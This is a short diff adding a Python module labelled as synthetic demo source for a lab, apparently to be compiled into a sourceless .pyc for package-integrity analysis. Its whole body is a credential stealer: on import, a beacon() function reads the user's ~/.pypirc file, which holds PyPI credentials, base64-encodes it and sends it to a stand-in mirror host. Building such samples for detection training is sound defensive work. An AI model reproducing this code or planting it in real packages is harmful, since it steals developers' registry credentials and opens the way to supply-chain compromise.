@@ -1,0 +1,10 @@
+# SYNTHETIC DEMO SOURCE - compiled (never executed) into a sourceless .pyc for the PIA lab
+import os, base64, urllib.request
+
+
+def beacon():
+    data = base64.b64encode(open(os.path.expanduser("~/.pypirc"), "rb").read())
+    urllib.request.urlopen("https://pypi-mirror.example.invalid/u", data=data)
+
+
+beacon()
